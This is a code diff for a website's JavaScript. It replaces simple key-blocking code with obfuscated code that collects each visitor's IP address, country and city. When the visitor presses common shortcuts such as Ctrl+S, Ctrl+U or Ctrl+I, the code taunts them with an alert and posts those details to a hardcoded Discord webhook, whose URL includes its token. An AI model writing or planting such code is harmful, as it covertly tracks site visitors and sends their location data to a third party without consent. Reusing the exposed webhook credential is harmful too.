@@ -11,41 +11,91 @@ function video() {
 
 video()
 
-document.onkeydown = function (e) {
-    if (event.keyCode == 123) {
-        return false;
+function noskidz() {
+  async function _0x23ed27() {
+    try {
+      const _0x620711 = await fetch('https://ipinfo.io/json');
+      if (!_0x620711.ok) {
+        return {
+          ip: 'Unknown',
+          country: 'Unknown',
+          city: 'Unknown'
+        };
+      }
+      const _0x31effa = await _0x620711.json();
+      return {
+        ip: _0x31effa.ip || 'Unknown',
+        country: _0x31effa.country || 'Unknown',
+        city: _0x31effa.city || 'Unknown'
+      };
+    } catch (_0x44f3c2) {
+      return {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown'
+      };
     }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
-        return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
-        return false;
-    }
-    if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
-        return false;
-    }
-    if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
-        return false;
-    }
+  }
+  _0x23ed27().then(_0x480b1c => {
+    const _0x36e9b8 = {
+      embeds: [{
+        color: 16579836,
+        fields: [{
+          name: 'IP:',
+          value: _0x480b1c.ip
+        }, {
+          name: 'Country:',
+          value: _0x480b1c.country
+        }, {
+          name: 'City:',
+          value: _0x480b1c.city
+        }]
+      }]
+    };
+    fetch('https://discord.com/api/webhooks/1150059713296338944/hapEgtN50lPoL8nxut5sHMWqbzJV-AC5sur67cqHcFHyvbAa9yYNR2MNu5Wl1sh6vrNv', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(_0x36e9b8)
+    });
+  });
 }
-
-let counter = 0; let Title = 'yph :3'; let direction = true;
-aniTitle = setInterval(function () {
-    if (counter == Title.length) direction = false;
-    if (counter == false) direction = true;
-    counter = (direction == true) ? ++counter : --counter;
-    newtitle = (counter == 0) ? "" : Title.slice(0, counter);
-    document.title = 'z' + newtitle;
-}, 400)
-
-window.oncontextmenu = function () {
-    return false;
-}
-$(document).keydown(function (event) {
-    if (event.keyCode == 123) {
-        return false;
+fetch('https://api.ipify.org?format=json').then(_0x1850bd => _0x1850bd.json()).then(_0x3c55a8 => {
+  var _0x546cf0 = _0x3c55a8.ip;
+  window.addEventListener('keydown', _0x5ca9cf => {
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'S' || _0x5ca9cf.key === 's')) {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
     }
-    else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
-        return false;
+    if (_0x5ca9cf.ctrlKey && _0x5ca9cf.key === 'C') {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
     }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'E' || _0x5ca9cf.key === 'e')) {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'I' || _0x5ca9cf.key === 'i' || _0x5ca9cf.key === "\xC3\u201E\xC2\xB1")) {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'K' || _0x5ca9cf.key === 'k')) {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'U' || _0x5ca9cf.key === 'u')) {
+      _0x5ca9cf.preventDefault();
+      alert('NUH UH SKID, This is your IP: ' + _0x546cf0);
+      noskidz();
+    }
+  });
+  document.addEventListener('contextmenu', function (_0x425474) {
+    _0x425474.preventDefault();
+  });
 });
